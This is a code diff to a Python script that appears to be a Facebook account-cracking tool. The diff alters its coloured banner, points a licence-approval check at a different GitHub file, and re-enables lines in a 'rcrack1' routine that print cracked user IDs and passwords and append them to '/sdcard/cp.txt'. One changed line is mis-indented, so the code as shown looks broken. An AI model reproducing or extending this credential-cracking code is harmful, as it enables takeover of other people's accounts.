@@ -318,7 +318,7 @@ logo = ("""
 
 \033[1;94m██████╗ ███████╗██████╗     
 \033[1;91m██╔══██╗██╔════╝██╔══██╗    
-\033[1;95m██████╔╝█████╗  ██║  ██║                 
+\033[1;35m██████╔╝█████╗  ██║  ██║                 
 \033[1;96m██╔══██╗██╔══╝  ██║  ██║    
 \033[1;32m██║  ██║███████╗██████╔╝    
 \033[1;34m╚═╝  ╚═╝╚══════╝╚═════╝                                                                                                                                              
@@ -345,7 +345,7 @@ def meyexudi():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
   try:
-    #httpCaht = requests.get('https://github.com/arohi999/KHALIFA/blob/main/Approval.txt').text
+    httpCaht = requests.get('https://github.com/xive404/redx/blob/main/xxx').text
     if id in httpCaht:
       print(fuckyoursali)
       print(hedaborakarent)
@@ -580,9 +580,9 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[82:97]
 
-              #  print(f"\x1b[38;5;196m[X-CP🩸] {uid}|{ps} = \033[1;34m'+pro+'  \033[0;97m")
+                print(f"\x1b[38;5;196m[X-CP🩸] {uid}|{ps} = \033[1;34m'+pro+'  \033[0;97m")
 
-              #  open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
+               open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
 
                 cps.append(uid)
 
